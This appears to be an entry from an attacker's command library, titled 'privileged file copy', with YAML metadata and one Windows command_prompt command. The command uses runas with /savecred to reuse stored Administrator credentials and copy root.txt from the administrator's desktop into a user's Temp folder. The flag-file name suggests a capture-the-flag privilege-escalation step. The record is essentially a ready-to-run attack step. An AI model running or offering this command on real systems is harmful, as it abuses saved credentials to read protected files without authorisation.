---
id: 5f385724-a8b4-40e5-a16b-151a7ac6ca7f
name: privileged file copy
type: command
executor: command_prompt
data: 'runas /user:hostname\Administrator /savecred "cmd.exe /c type c:\users\administrator\desktop\root.txt
  > C:\Users\security\AppData\Local\Temp\root.txt"

  '
output: null
created_at: '2020-07-14T18:15:08.367859+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# privileged file copy

```command_prompt
runas /user:hostname\Administrator /savecred "cmd.exe /c type c:\users\administrator\desktop\root.txt > C:\Users\security\AppData\Local\Temp\root.txt"

```
